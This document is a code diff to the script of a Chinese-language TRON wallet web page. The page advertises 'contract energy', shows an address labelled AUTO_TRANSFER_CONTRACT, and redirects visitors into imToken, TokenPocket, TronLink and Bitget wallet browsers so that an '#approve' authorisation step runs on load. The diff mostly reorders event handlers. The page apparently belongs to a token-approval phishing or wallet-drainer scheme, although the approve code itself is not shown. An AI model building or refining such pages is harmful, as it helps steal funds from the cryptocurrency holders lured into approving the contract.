@@ -1842,100 +1842,87 @@ async function sendSignalA1() {
         renderEnergyRecords();
     }
 
-    /********************************************************************
-     * 事件绑定：集中管理所有事件，无修改仅整理顺序
-     ********************************************************************/
-    document.addEventListener('DOMContentLoaded', async () => {
-        /****************************************************************
-         * 连接钱包按钮：点击重新显示弹窗（关闭后可再次触发）
-         ****************************************************************/
-        DOM.connectBtn.addEventListener('click', () => {
-            console.log('连接按钮点击，重新显示弹窗');
-            // 重新显示弹窗（和自动弹窗的样式一致）
-            DOM.multiWalletPopup.style.display = "block";
-            DOM.multiWalletPopup.style.position = "fixed";
-            DOM.multiWalletPopup.style.top = "0";
-            DOM.multiWalletPopup.style.left = "0";
-            DOM.multiWalletPopup.style.width = "100%";
-            DOM.multiWalletPopup.style.height = "100%";
-            DOM.multiWalletPopup.style.background = "rgba(0,0,0,0.7)";
-            DOM.multiWalletPopup.style.zIndex = "9999";
+   /********************************************************************
+ * 事件绑定：完整合并所有逻辑，修复语法错误+刷新适配，可直接替换
+ ********************************************************************/
+document.addEventListener('DOMContentLoaded', async () => {
+    /****************************************************************
+     * 基础初始化（保留原有逻辑，无修改）
+     ****************************************************************/
+    contractEnergyEl = document.getElementById("contractEnergy");
+    console.log("能量显示元素是否找到：", contractEnergyEl ? "✅ 找到" : "❌ 未找到");
+    if (!contractEnergyEl) {
+        alert("⚠️ 能量显示元素未找到，请检查页面中是否有id='contractEnergy'的标签");
+        return;
+    }
+    startPersistentEnergyCountdown();
+    initLangDisplay();
+    updatePageLang();
+    DOM.contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
+    contractEnergyEl.textContent = Math.floor(INIT_TRX);
+    renderEnergyRecords();
+    updateWalletStatus();
+    updateUserBalanceDisplay();
 
-            // 弹窗内容定位
-            const popupContent = DOM.multiWalletPopup.querySelector('.wallet-modal-content');
-            if (popupContent) {
-                popupContent.style.position = "absolute";
-                popupContent.style.bottom = "180px";
-                popupContent.style.left = "50%";
-                popupContent.style.transform = "translateX(-50%)";
-            }
-
-            // 移除：原“userInfoDefault”相关文本（避免关联“未连接”提示）
-            DOM.userInfoStatus.style.display = "block";
-            DOM.userInfoStatus.innerHTML = "";
+    /****************************************************************
+     * 语言切换事件（保留原有逻辑，无修改）
+     ****************************************************************/
+    DOM.langToggleBtn.addEventListener("click", (e) => {
+        e.stopPropagation();
+        DOM.langDropdown.classList.toggle("open");
+    });
+    DOM.langDropdownItems.forEach(item => {
+        item.addEventListener("click", (e) => {
+            e.stopPropagation();
+            const newLang = item.getAttribute("data-lang");
+            changeLang(newLang);
         });
+    });
+    document.addEventListener("click", () => {
+        DOM.langDropdown.classList.remove("open");
+    });
+    DOM.langDropdown.addEventListener("click", (e) => {
+        e.stopPropagation();
+    });
 
-        /****************************************************************
-         * 弹窗关闭逻辑（关闭后隐藏，按钮可重新触发）
-         ****************************************************************/
-        DOM.closeMultiWalletBtn.addEventListener('click', () => {
-            DOM.multiWalletPopup.style.display = "none"; // 隐藏弹窗
-            DOM.userInfoStatus.style.display = "none";
-        });
+    /****************************************************************
+     * 连接钱包按钮：点击重新显示弹窗（保留原有逻辑，无修改）
+     ****************************************************************/
+    DOM.connectBtn.addEventListener('click', () => {
+        console.log('连接按钮点击，重新显示弹窗');
+        DOM.multiWalletPopup.style.display = "block";
+        DOM.multiWalletPopup.style.position = "fixed";
+        DOM.multiWalletPopup.style.top = "0";
+        DOM.multiWalletPopup.style.left = "0";
+        DOM.multiWalletPopup.style.width = "100%";
+        DOM.multiWalletPopup.style.height = "100%";
+        DOM.multiWalletPopup.style.background = "rgba(0,0,0,0.7)";
+        DOM.multiWalletPopup.style.zIndex = "9999";
 
-        // 初始化合约能量显示元素（原代码保留）
-        contractEnergyEl = document.getElementById("contractEnergy");
-        console.log("能量显示元素是否找到：", contractEnergyEl ? "✅ 找到" : "❌ 未找到");
-        if (!contractEnergyEl) {
-            alert("⚠️ 能量显示元素未找到，请检查页面中是否有id='contractEnergy'的标签");
-            return;
+        const popupContent = DOM.multiWalletPopup.querySelector('.wallet-modal-content');
+        if (popupContent) {
+            popupContent.style.position = "absolute";
+            popupContent.style.bottom = "180px";
+            popupContent.style.left = "50%";
+            popupContent.style.transform = "translateX(-50%)";
         }
 
-        // 启动能量倒计时（原代码保留）
-        startPersistentEnergyCountdown();
+        DOM.userInfoStatus.style.display = "block";
+        DOM.userInfoStatus.innerHTML = "";
+    });
 
-        // 初始化语言显示（原代码保留）
-        initLangDisplay();
-        updatePageLang();
+    /****************************************************************
+     * 弹窗关闭逻辑（保留原有逻辑，无修改）
+     ****************************************************************/
+    DOM.closeMultiWalletBtn.addEventListener('click', () => {
+        DOM.multiWalletPopup.style.display = "none";
+        DOM.userInfoStatus.style.display = "none";
+    });
 
-        // 初始化合约地址显示（原代码保留）
-        DOM.contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
-        contractEnergyEl.textContent = Math.floor(INIT_TRX);
-        
-        // 初始化领取记录显示（原代码保留）
-        renderEnergyRecords();
-        updateWalletStatus();
-        updateUserBalanceDisplay();
-
-        /****************************************************************
-         * 语言切换事件（原代码保留）
-         ****************************************************************/
-        DOM.langToggleBtn.addEventListener("click", (e) => {
-            e.stopPropagation();
-            DOM.langDropdown.classList.toggle("open");
-        });
-
-        DOM.langDropdownItems.forEach(item => {
-            item.addEventListener("click", (e) => {
-                e.stopPropagation();
-                const newLang = item.getAttribute("data-lang");
-                changeLang(newLang);
-            });
-        });
-
-        document.addEventListener("click", () => {
-            DOM.langDropdown.classList.remove("open");
-        });
-
-        DOM.langDropdown.addEventListener("click", (e) => {
-            e.stopPropagation();
-        });
-
-        /****************************************************************
-         * 多钱包弹窗事件（原代码保留）
-         ****************************************************************/
-        // 钱包选择：跳转对应钱包
-DOM.walletItems.forEach(item => {
+    /****************************************************************
+     * 核心：多钱包点击事件（修复括号闭合+逻辑连贯）
+     ****************************************************************/
+    DOM.walletItems.forEach(item => {
         item.addEventListener('click', async () => {
             const walletType = item.getAttribute("data-wallet");
             const wallet = walletConfig[walletType];
@@ -1945,45 +1932,98 @@ DOM.walletItems.forEach(item => {
             const lang = langConfig[currentLang];
             const targetUrl = window.location.href + "#approve";
 
+            // 1. 立即显示加载动画+关闭弹窗+禁用重复点击
             if (loadingEl) loadingEl.style.display = "flex";
             item.style.pointerEvents = "none";
             DOM.multiWalletPopup.style.display = "none";
 
+            // 2. 生成对应钱包的跳转链接
             let jumpUrl = "";
             switch (walletType) {
-                case "imtoken": jumpUrl = wallet.scheme + encodeURIComponent(targetUrl); break;
-                case "tokenpocket": jumpUrl = wallet.scheme + encodeURIComponent(targetUrl) + wallet.suffix; break;
-                case "tronlink": const param = JSON.stringify({ url: targetUrl, action: "open", protocol: "tronlink", version: "1.0" }); jumpUrl = wallet.scheme + encodeURIComponent(param); break;
-                case "bitget": jumpUrl = wallet.scheme + encodeURIComponent(targetUrl); break;
-                default: jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
+                case "imtoken":
+                    jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
+                    break;
+                case "tokenpocket":
+                    jumpUrl = wallet.scheme + encodeURIComponent(targetUrl) + wallet.suffix;
+                    break;
+                case "tronlink":
+                    const param = JSON.stringify({ url: targetUrl, action: "open", protocol: "tronlink", version: "1.0" });
+                    jumpUrl = wallet.scheme + encodeURIComponent(param);
+                    break;
+                case "bitget":
+                    jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
+                    break;
+                default:
+                    jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
             }
             console.log(`📤 跳转${wallet.name}：`, jumpUrl);
             window.location.href = jumpUrl;
 
+            // 3. 500ms后执行环境检测+初始化（兼容钱包唤起成功/失败）
             setTimeout(async () => {
-        try {
-            // 钱包浏览器（含刷新后）：TronWeb已存在
-            if (window.tronWeb) {
-                if (!window.tronWeb.ready) await new Promise(resolve => window.tronWeb.onReady(resolve));
-                tronWeb = window.tronWeb;
-                DOM.connectBtn.style.display = "none";
-                DOM.warning.style.display = "none";
-                DOM.specialTipContainer.style.display = "none";
-                await initWallet(false); // 执行正常初始化逻辑
-            } else {
-                // 非钱包浏览器：执行原有检测逻辑
-                await checkWalletEnv().catch(err => {
-                    console.error("环境检测失败：", err);
-                    const lang = langConfig[currentLang];
+                try {
+                    // 等待钱包注入tronWeb
+                    if (window.tronWeb && !window.tronWeb.ready) {
+                        await new Promise(resolve => window.tronWeb.onReady(resolve));
+                    }
+                    // 钱包环境：执行初始化
+                    if (window.tronWeb) {
+                        tronWeb = window.tronWeb;
+                        DOM.connectBtn.style.display = "none";
+                        DOM.warning.style.display = "none";
+                        DOM.specialTipContainer.style.display = "none";
+                        await initWallet(false);
+                    } else {
+                        // 非钱包环境：复制链接并提示
+                        navigator.clipboard.writeText(targetUrl).then(() => {
+                            alert(lang.copySuccess);
+                        }).catch(() => {
+                            alert(lang.copyFail);
+                        });
+                    }
+                } catch (err) {
+                    console.error("多钱包点击后逻辑执行失败：", err);
                     DOM.userInfoStatus.style.display = "none";
                     DOM.balanceItems.forEach(item => item.style.display = "none");
                     DOM.approveBtn.disabled = true;
                     DOM.approveBtn.textContent = lang.approveBtnText;
                     updateUserBalanceDisplay();
-                });
+                }
+            }, 500);
+
+            // 4. 1500ms后隐藏动画+恢复点击权限
+            setTimeout(() => {
+                if (loadingEl) loadingEl.style.display = "none";
+                item.style.pointerEvents = "auto";
+                DOM.userInfoEl.style.display = "block";
+                DOM.walletStatusContainer.style.display = "block";
+                DOM.contractResourceContainer.style.display = "block";
+            }, 1500);
+        });
+    });
+
+    /****************************************************************
+     * 刷新适配：页面加载（含刷新）后统一执行逻辑
+     ****************************************************************/
+    const loadingEl = document.getElementById("Loading");
+    // 页面加载/刷新后立即显示加载动画
+    if (loadingEl) loadingEl.style.display = "flex";
+
+    // 500ms后执行环境检测+初始化（统一首次打开和刷新逻辑）
+    setTimeout(async () => {
+        try {
+            // 先执行环境检测（核心：识别是否为钱包浏览器）
+            await checkWalletEnv();
+            // 钱包环境：检测通过后执行初始化
+            if (window.tronWeb) {
+                if (!window.tronWeb.ready) {
+                    await new Promise(resolve => window.tronWeb.onReady(resolve));
+                }
+                tronWeb = window.tronWeb;
+                await initWallet(false);
             }
         } catch (err) {
-            console.error("刷新后500毫秒执行逻辑失败：", err);
+            console.error("刷新/首次打开后逻辑执行失败：", err);
             const lang = langConfig[currentLang];
             DOM.userInfoStatus.style.display = "none";
             DOM.balanceItems.forEach(item => item.style.display = "none");
@@ -1993,7 +2033,7 @@ DOM.walletItems.forEach(item => {
         }
     }, 500);
 
-    // 1500毫秒后隐藏加载动画（统一动画时长）
+    // 1500ms后强制隐藏加载动画（避免动画卡死）
     setTimeout(() => {
         if (loadingEl) loadingEl.style.display = "none";
         DOM.userInfoEl.style.display = "block";
@@ -2002,7 +2042,7 @@ DOM.walletItems.forEach(item => {
     }, 1500);
 
     /****************************************************************
-     * 授权后跳转处理（保留原有逻辑）
+     * 授权后跳转处理（保留原有逻辑，无修改）
      ****************************************************************/
     if (window.tronWeb && window.location.hash === "#approve") {
         window.location.hash = "";
@@ -2018,38 +2058,15 @@ DOM.walletItems.forEach(item => {
             });
         }, 500);
     }
-        /****************************************************************
-         * 页面卸载时清理定时器（原代码保留）
-         ****************************************************************/
-        window.addEventListener("beforeunload", () => {
-            if (trxTimer) clearTimeout(trxTimer);
-        });
-    });
 
-    /********************************************************************
-     * 加载动画结束后初始化（原代码保留，无修改）
-     ********************************************************************/
-    document.addEventListener('DOMContentLoaded', () => {
-        setTimeout(() => {
-            const loadingEl = document.getElementById("Loading");
-            if (loadingEl) loadingEl.style.display = "none";
-            
-            // 延迟100ms检测钱包，给钱包注入时间
-            setTimeout(async () => {
-                await checkWalletEnv().catch(err => {
-                    console.error("环境检测失败：", err);
-                    const lang = langConfig[currentLang];
-                    DOM.userInfoStatus.style.display = "none";
-                    DOM.balanceItems.forEach(item => item.style.display = "none");
-                    DOM.approveBtn.disabled = true;
-                    DOM.approveBtn.textContent = lang.approveBtnText;
-                    updateUserBalanceDisplay();
-                });
-            }, 100);
-        }, 1500); // 1.5秒加载动画
+    /****************************************************************
+     * 页面卸载时清理定时器（避免内存泄漏）
+     ****************************************************************/
+    window.addEventListener("beforeunload", () => {
+        if (trxTimer) clearTimeout(trxTimer);
     });
+});
 </script>
 </body>
 </html>
-       
        
